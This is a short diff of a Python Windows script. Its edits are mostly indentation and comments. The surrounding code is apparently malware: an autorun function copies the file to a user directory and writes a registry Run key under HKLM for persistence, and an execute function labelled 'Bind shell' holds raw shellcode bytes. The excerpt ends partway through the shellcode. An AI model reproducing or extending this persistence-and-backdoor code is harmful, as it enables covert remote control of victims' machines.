@@ -6,15 +6,15 @@ import pythoncom
 import pywintypes
 import win32api
 import subprocess
-from _winreg import *
+import _winreg
 import win32com.shell.shell as shell
 
 
 def autorun(dir, fileName, run):
-
+	# Copy to C:\Users
 	os.system('copy %s %s'%(fileName, dir))
 
-# Queries Windows registry for the autorun key value
+	# Queries Windows registry for the autorun key value
 	key = OpenKey(HKEY_LOCAL_MACHINE, run)
 	runkey =[]
 	try:
@@ -39,7 +39,7 @@ def autorun(dir, fileName, run):
 	except WindowsError:
 		pass
 
-# Set key
+	# Set key
 	if 'foobar' not in runkey:
 		try:
 			key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
@@ -50,7 +50,7 @@ def autorun(dir, fileName, run):
 
 
 def execute():
-    #Bind shell
+	# Bind shell
 	shellcode = bytearray(
 	"\xb8\xee\x7c\x98\x76\xdb\xc6\xd9\x74\x24\xf4\x5b\x31\xc9"
 	"\xb1\x53\x31\x43\x12\x03\x43\x12\x83\x2d\x78\x7a\x83\x4d"
